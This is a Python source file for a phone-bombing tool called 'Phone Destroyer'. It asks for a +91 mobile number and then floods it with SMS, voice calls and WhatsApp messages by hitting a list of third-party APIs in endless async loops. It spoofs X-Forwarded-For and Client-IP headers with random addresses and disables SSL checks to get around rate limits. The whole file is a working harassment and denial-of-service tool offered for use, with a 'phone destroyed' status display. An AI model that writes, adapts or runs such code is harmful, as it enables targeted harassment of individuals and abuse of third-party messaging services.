import asyncio as aio
import aiohttp as ah
import time as t
import random as r
import threading as th
import sys
from ui import BlackforgeUI as TerminalUI, R1, R2, R3, R4, R5, BORDER, WHITE, MUTED, SUCCESS, WARNING, DANGER, RESET, center_text
from utils.api import FeroXDevs_APIS as A

class PhoneSpammer:
    def __init__(self):
        self._flag = True
        self._data = {
            "a": 0,
            "b": 0,
            "c": 0,
            "d": 0,
            "e": 0,
            "f": 0,
            "g": t.time(),
            "h": len(A)
        }

    async def _attack(self, sess, item, num):
        while self._flag:
            try:
                n = item["name"]
                u = item["url"](num) if callable(item["url"]) else item["url"]
                h = item["headers"].copy()
                h["X-Forwarded-For"] = f"{r.randint(1,255)}.{r.randint(1,255)}.{r.randint(1,255)}.{r.randint(1,255)}"
                h["Client-IP"] = h["X-Forwarded-For"]
                h["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
                
                self._data["a"] += 1
                
                if "call" in n.lower() or "voice" in n.lower():
                    typ = "CALL"
                    self._data["d"] += 1
                elif "whatsapp" in n.lower():
                    typ = "WHATSAPP"
                    self._data["e"] += 1
                else:
                    typ = "SMS"
                    self._data["f"] += 1
                
                if item["method"] == "POST":
                    d = item["data"](num) if item["data"] else None
                    async with sess.post(u, headers=h, data=d, timeout=3, ssl=False) as resp:
                        if resp.status in [200, 201, 202]:
                            self._data["b"] += 1
                            TerminalUI.log(f"{SUCCESS}[+] {typ:<8} {BORDER}│ {WHITE}{n:<30} {BORDER}│ {SUCCESS}Success{RESET}")
                        else:
                            self._data["c"] += 1
                else:
                    async with sess.get(u, headers=h, timeout=3, ssl=False) as resp:
                        if resp.status in [200, 201, 202]:
                            self._data["b"] += 1
                            TerminalUI.log(f"{SUCCESS}[+] {typ:<8} {BORDER}│ {WHITE}{n:<30} {BORDER}│ {SUCCESS}Success{RESET}")
                        else:
                            self._data["c"] += 1
                
                await aio.sleep(0.001)
                
            except Exception:
                self._data["c"] += 1
                continue

    def _stats(self):
        while self._flag:
            elapsed = t.time() - self._data["g"]
            rate = (self._data["b"] / self._data["a"] * 100) if self._data["a"] > 0 else 0
            
            TerminalUI.render_banner("Phone Destroyer - Live Stats")
            print(TerminalUI.b_top("Bombing Statistics"))
            print(TerminalUI.b_row())
            print(TerminalUI.b_row(f"{R1}Time Elapsed {BORDER}│ {WHITE}{elapsed:.1f}s{RESET}"))
            print(TerminalUI.b_row(f"{R1}Calls Sent   {BORDER}│ {R2}{self._data['d']}{RESET}"))
            print(TerminalUI.b_row(f"{R1}WhatsApp Sent{BORDER}│ {R2}{self._data['e']}{RESET}"))
            print(TerminalUI.b_row(f"{R1}SMS Sent     {BORDER}│ {R2}{self._data['f']}{RESET}"))
            print(TerminalUI.b_row(f"{R1}Successful   {BORDER}│ {SUCCESS}{self._data['b']}{RESET}"))
            print(TerminalUI.b_row(f"{R1}Total Attack {BORDER}│ {WHITE}{self._data['a']}{RESET}"))
            print(TerminalUI.b_row(f"{R1}Success Rate {BORDER}│ {SUCCESS}{rate:.1f}%{RESET}"))
            
            if self._data["b"] > 2000:
                st = f"{DANGER}STATUS: PHONE DESTROYED{RESET}"
            elif self._data["b"] > 1000:
                st = f"{DANGER}STATUS: PHONE HANGING{RESET}"
            elif self._data["b"] > 500:
                st = f"{WARNING}STATUS: PHONE SLOWING{RESET}"
            elif self._data["b"] > 100:
                st = f"{SUCCESS}STATUS: BOMBING ACTIVE{RESET}"
            else:
                st = f"{R2}STATUS: INITIATING{RESET}"
            
            print(TerminalUI.b_row())
            print(TerminalUI.b_row(f"{R1}Status       {BORDER}│ {st}"))
            print(TerminalUI.b_row())
            print(TerminalUI.b_div("Control"))
            print(TerminalUI.b_row(f"  {DANGER}Press Ctrl+C to stop the attack{RESET}"))
            print(TerminalUI.b_bottom())
            print()
            
            t.sleep(2.5)

    async def _start(self, phone):
        TerminalUI.render_banner("Phone Destroyer - Active")
        print(TerminalUI.b_top("Initializing Attack"))
        print(TerminalUI.b_row(f"{R1}Target Locked {BORDER}│ {WHITE}+91{phone}{RESET}"))
        print(TerminalUI.b_row(f"{R1}APIs Loaded   {BORDER}│ {WHITE}{len(A)} APIs{RESET}"))
        print(TerminalUI.b_row())
        print(TerminalUI.b_bottom())
        print()
        
        for i in range(3, 0, -1):
            print(center_text(f"{R3}Starting in {i}...{RESET}"))
            await aio.sleep(1)
        
        TerminalUI.render_banner("Phone Destroyer - Running")
        print(TerminalUI.b_top("Attack Console Logs"))
        print(TerminalUI.b_row(f"{SUCCESS}Attack Started!{RESET}"))
        print(TerminalUI.b_div())
        
        st = th.Thread(target=self._stats)
        st.daemon = True
        st.start()
        
        conn = ah.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
        async with ah.ClientSession(connector=conn) as sess:
            tasks = []
            for item in A:
                tasks.append(aio.create_task(self._attack(sess, item, phone)))
            await aio.gather(*tasks, return_exceptions=True)
    
    def _stop(self):
        self._flag = False

def run_spammer():
    TerminalUI.render_banner("Phone Spammer Tool By SAMIR & LYNX")
    print(TerminalUI.b_top("Configure Attack"))
    print(TerminalUI.b_row(f"{R1}Developer {BORDER}│ {WHITE}SAMIR & LYNX{RESET}"))
    print(TerminalUI.b_row(f"{R1}Database  {BORDER}│ {WHITE}{len(A)} Spammer APIs Ready{RESET}"))
    print(TerminalUI.b_row())
    print(TerminalUI.b_bottom())
    print()

    p_prompt = center_text(f"{BORDER}╭──────────[ {R1}Mobile Number (10 digits){RESET}{BORDER} ]──────────╮{RESET}")
    p_in     = center_text(f"{BORDER}╰─────[ {R2}❯❯{RESET}{BORDER} ]{RESET} ")
    print(p_prompt)
    try:
        phone = input(p_in).strip()
    except (KeyboardInterrupt, EOFError):
        return

    if not phone.isdigit() or len(phone) != 10:
        print()
        print(center_text(f"{DANGER}✗ Invalid number! Must be 10 digits.{RESET}"))
        t.sleep(1.5)
        return
    
    print()
    confirm_prompt = center_text(f"{BORDER}╭──────────[ {R1}Activate Destroyer on +91{phone}? (y/n){RESET}{BORDER} ]──────────╮{RESET}")
    confirm_in     = center_text(f"{BORDER}╰─────[ {R2}❯❯{RESET}{BORDER} ]{RESET} ")
    print(confirm_prompt)
    try:
        confirm = input(confirm_in).strip().lower()
    except (KeyboardInterrupt, EOFError):
        return

    if confirm != 'y':
        print()
        print(center_text(f"{WARNING}⚠ Spammer activation aborted.{RESET}"))
        t.sleep(1.2)
        return
    
    destroyer = PhoneSpammer()
    print()
    print(center_text(f"{WARNING}Attack started! Press {R2}Ctrl+C{WARNING} to stop.{RESET}"))
    print()
    try:
        aio.run(destroyer._start(phone))
    except KeyboardInterrupt:
        destroyer._stop()
        print()
        print(center_text(f"{DANGER}✗ Attack stopped by user.{RESET}"))
        t.sleep(1.5)

    elapsed = t.time() - destroyer._data["g"]
    
    TerminalUI.render_banner("Phone Destroyer - Summary Report")
    print(TerminalUI.b_top("Final Spammer Report"))
    print(TerminalUI.b_row())
    print(TerminalUI.b_row(f"{R1}Target      {BORDER}│ {WHITE}+91{phone}{RESET}"))
    print(TerminalUI.b_row(f"{R1}Calls       {BORDER}│ {R2}{destroyer._data['d']}{RESET}"))
    print(TerminalUI.b_row(f"{R1}WhatsApp    {BORDER}│ {R2}{destroyer._data['e']}{RESET}"))
    print(TerminalUI.b_row(f"{R1}SMS         {BORDER}│ {R2}{destroyer._data['f']}{RESET}"))
    print(TerminalUI.b_row(f"{R1}Successful  {BORDER}│ {SUCCESS}{destroyer._data['b']}{RESET}"))
    print(TerminalUI.b_row(f"{R1}Total Hits  {BORDER}│ {WHITE}{destroyer._data['a']}{RESET}"))
    print(TerminalUI.b_row(f"{R1}Time Taken  {BORDER}│ {WHITE}{elapsed:.1f}s{RESET}"))
    
    if destroyer._data["b"] > 2000:
        res = f"{DANGER}Phone destroyed{RESET}"
    elif destroyer._data["b"] > 1000:
        res = f"{DANGER}Phone hanged{RESET}"
    elif destroyer._data["b"] > 500:
        res = f"{WARNING}Phone severely damaged{RESET}"
    else:
        res = f"{SUCCESS}Phone partially affected{RESET}"
        
    print(TerminalUI.b_row())
    print(TerminalUI.b_row(f"{R1}Outcome     {BORDER}│ {res}"))
    print(TerminalUI.b_row())
    print(TerminalUI.b_bottom())
    print()
    input(center_text(f"{MUTED}Press Enter to return to main menu...{RESET}"))
